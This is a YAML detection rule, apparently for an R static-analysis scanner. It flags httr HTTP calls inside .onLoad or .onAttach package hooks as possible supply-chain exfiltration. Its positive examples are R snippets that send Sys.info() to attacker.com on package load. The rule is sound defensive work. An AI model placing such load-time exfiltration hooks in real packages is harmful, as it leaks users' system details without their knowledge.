name: onload_calls_httr_rule
version: "0.2.0"
type: warning
attck:
  - T1041
  - T1195.002
message: >-
  An httr HTTP call inside .onLoad or .onAttach sends an outbound request
  automatically when a package is loaded. Matches all httr verb functions
  (GET, POST, PUT, PATCH, DELETE, HEAD) and httr::VERB(), both qualified
  (httr::) and unqualified.
description: >-
  Flag httr HTTP verb calls inside .onLoad or .onAttach. Covers all methods
  because any outbound request in a hook can exfiltrate data or stage a
  payload. Matches assignments using <-, =, or -> so that all syntactically
  valid definition forms are covered.
xpath: >-
  (//expr | //expr_or_assign_or_help)[
    (
      (LEFT_ASSIGN or EQ_ASSIGN)
      and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
      and expr[FUNCTION][
        .//SYMBOL_FUNCTION_CALL[
          text() = 'GET' or text() = 'POST' or text() = 'PUT' or
          text() = 'PATCH' or text() = 'DELETE' or text() = 'HEAD'
        ]
        or .//expr[
          SYMBOL_PACKAGE[text() = 'httr']
          and NS_GET
          and SYMBOL_FUNCTION_CALL[text() = 'VERB']
        ]
      ]
    )
    or
    (
      RIGHT_ASSIGN
      and expr[2]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
      and expr[1][
        .//SYMBOL_FUNCTION_CALL[
          text() = 'GET' or text() = 'POST' or text() = 'PUT' or
          text() = 'PATCH' or text() = 'DELETE' or text() = 'HEAD'
        ]
        or .//expr[
          SYMBOL_PACKAGE[text() = 'httr']
          and NS_GET
          and SYMBOL_FUNCTION_CALL[text() = 'VERB']
        ]
      ]
    )
  ]
example_positive:
  - |
    .onLoad <- function(libname, pkgname) {
      httr::POST("https://attacker.com/collect", body = list(host = Sys.info()))
    }
  - |
    .onAttach <- function(libname, pkgname) {
      httr::GET("https://attacker.com/ping", query = list(host = Sys.info()))
    }
  - |
    .onLoad <- function(libname, pkgname) {
      POST("https://attacker.com/collect", body = list(host = Sys.info()))
    }
  - |
    .onLoad = function(libname, pkgname) {
      httr::PUT("https://attacker.com/collect", body = list(user = Sys.info()))
    }
  - |
    (function(libname, pkgname) {
      httr::VERB("POST", "https://attacker.com/collect", body = list(host = Sys.info()))
    }) -> .onAttach
example_negative:
  - |
    send_data <- function(url, data) {
      httr::POST(url, body = data)
    }
  - |
    .onUnload <- function(libpath) {
      httr::GET("https://example.com/unloaded")
    }
